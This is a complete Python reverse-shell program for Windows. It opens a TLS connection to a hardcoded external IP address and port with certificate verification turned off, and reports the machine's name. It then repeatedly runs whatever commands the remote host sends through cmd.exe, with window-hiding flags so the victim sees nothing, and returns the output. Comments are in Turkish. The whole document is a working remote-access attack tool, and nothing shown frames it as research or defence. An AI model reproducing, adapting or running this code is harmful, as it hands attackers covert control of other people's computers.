import socket
import ssl
import subprocess
import os
import sys

def connect_back():
    h = '185.194.175.132'
    p = 7001
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        ssls = ctx.wrap_socket(s, server_hostname='lab-manager')
        ssls.connect((h, p))
        
        computer_name = os.environ.get("COMPUTERNAME", "PC")
        ssls.send(f"--- Baglanti Saglandi: {computer_name} ---\n\n".encode())
        
        while True:
            # Komut satırını al ve temizle
            data = ssls.recv(1024).decode('utf-8', 'ignore').strip()
            if not data or data == 'exit':
                break
            
            # Windows görünmezlik bayrakları
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            
            # Her komutu bağımsız bir süreç olarak çalıştırıp çıktıları yakala
            proc = subprocess.Popen(
                f'cmd.exe /c {data}',
                startupinfo=si,
                creationflags=subprocess.CREATE_NO_WINDOW,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout, stderr = proc.communicate()
            
            # Çıktıyı anında gönder ve komut satırı belirtecini ekle
            ssls.send(stdout + stderr + b"\nC:> ")
            
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    connect_back()
